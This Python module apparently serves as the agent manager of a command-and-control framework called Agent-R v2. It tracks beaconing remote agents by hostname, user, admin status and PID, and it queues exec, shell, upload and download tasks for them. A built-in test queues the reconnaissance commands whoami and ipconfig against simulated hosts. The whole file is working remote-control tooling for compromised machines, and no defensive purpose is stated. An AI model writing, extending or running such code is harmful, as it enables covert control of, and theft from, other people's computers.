"""
Agent-R v2 Agent Manager
Tracks multiple connected agents, manages task queues
"""

import uuid
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from collections import deque


@dataclass
class Task:
    """Represents a task to be executed by an agent."""
    task_id: str
    task_type: str  # exec, upload, download, exit, shell
    payload: str
    created_at: float = field(default_factory=time.time)
    completed: bool = False
    result: Optional[str] = None
    result_at: Optional[float] = None


@dataclass 
class Agent:
    """Represents a connected agent."""
    agent_id: str
    hostname: str = "unknown"
    username: str = "unknown"
    is_admin: bool = False
    os_version: str = "unknown"
    pid: int = 0
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    task_queue: deque = field(default_factory=deque)
    completed_tasks: List[Task] = field(default_factory=list)
    
    def is_alive(self, timeout: int = 60) -> bool:
        """Check if agent has checked in recently."""
        return (time.time() - self.last_seen) < timeout
    
    def update_beacon(self, hostname: str = None, username: str = None, 
                      is_admin: bool = None, os_version: str = None, pid: int = None):
        """Update agent info from beacon."""
        self.last_seen = time.time()
        if hostname: self.hostname = hostname
        if username: self.username = username
        if is_admin is not None: self.is_admin = is_admin
        if os_version: self.os_version = os_version
        if pid: self.pid = pid
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for display."""
        return {
            "id": self.agent_id[:8],
            "hostname": self.hostname,
            "user": self.username,
            "admin": self.is_admin,
            "os": self.os_version,
            "last_seen": int(time.time() - self.last_seen),
            "pending_tasks": len(self.task_queue),
            "alive": self.is_alive()
        }


class AgentManager:
    """Manages multiple connected agents."""
    
    def __init__(self):
        self.agents: Dict[str, Agent] = {}
        self.current_agent: Optional[str] = None
    
    def register_agent(self, agent_id: str, **kwargs) -> Agent:
        """Register a new agent or update existing."""
        if agent_id in self.agents:
            self.agents[agent_id].update_beacon(**kwargs)
        else:
            self.agents[agent_id] = Agent(agent_id=agent_id, **kwargs)
            # Auto-select first agent
            if self.current_agent is None:
                self.current_agent = agent_id
        return self.agents[agent_id]
    
    def get_agent(self, agent_id: str) -> Optional[Agent]:
        """Get agent by ID (supports partial match)."""
        if agent_id in self.agents:
            return self.agents[agent_id]
        # Try partial match
        for aid, agent in self.agents.items():
            if aid.startswith(agent_id):
                return agent
        return None
    
    def get_current_agent(self) -> Optional[Agent]:
        """Get currently selected agent."""
        if self.current_agent:
            return self.agents.get(self.current_agent)
        return None
    
    def select_agent(self, agent_id: str) -> bool:
        """Select an agent for interaction."""
        agent = self.get_agent(agent_id)
        if agent:
            self.current_agent = agent.agent_id
            return True
        return False
    
    def queue_task(self, agent_id: str, task_type: str, payload: str) -> Task:
        """Queue a task for an agent."""
        agent = self.get_agent(agent_id)
        if not agent:
            raise ValueError(f"Agent {agent_id} not found")
        
        task = Task(
            task_id=str(uuid.uuid4()),
            task_type=task_type,
            payload=payload
        )
        agent.task_queue.append(task)
        return task
    
    def get_next_task(self, agent_id: str) -> Optional[Task]:
        """Get next pending task for an agent (called on beacon)."""
        agent = self.get_agent(agent_id)
        if agent and agent.task_queue:
            return agent.task_queue.popleft()
        return None
    
    def complete_task(self, agent_id: str, task_id: str, result: str):
        """Mark a task as completed with result."""
        agent = self.get_agent(agent_id)
        if agent:
            for task in agent.completed_tasks:
                if task.task_id == task_id:
                    task.completed = True
                    task.result = result
                    task.result_at = time.time()
                    return
            # Task might have been moved already, create completed entry
            task = Task(task_id=task_id, task_type="unknown", payload="", 
                       completed=True, result=result, result_at=time.time())
            agent.completed_tasks.append(task)
    
    def list_agents(self) -> List[Dict]:
        """List all agents with their status."""
        return [agent.to_dict() for agent in self.agents.values()]
    
    def get_alive_agents(self) -> List[Agent]:
        """Get all agents that have checked in recently."""
        return [a for a in self.agents.values() if a.is_alive()]
    
    def remove_agent(self, agent_id: str):
        """Remove an agent."""
        agent = self.get_agent(agent_id)
        if agent:
            del self.agents[agent.agent_id]
            if self.current_agent == agent.agent_id:
                self.current_agent = None


# Global manager instance
MANAGER = AgentManager()


if __name__ == "__main__":
    # Test
    mgr = AgentManager()
    
    # Simulate agent registration
    agent1 = mgr.register_agent("agent-123-abc", hostname="DESKTOP-1", username="admin", is_admin=True)
    agent2 = mgr.register_agent("agent-456-def", hostname="LAPTOP-2", username="user", is_admin=False)
    
    # Queue tasks
    mgr.queue_task("agent-123", "exec", "whoami")
    mgr.queue_task("agent-123", "exec", "ipconfig")
    
    # Simulate beacon
    print("Agents:", mgr.list_agents())
    
    # Get task for agent
    task = mgr.get_next_task("agent-123")
    print(f"Task for agent-123: {task}")
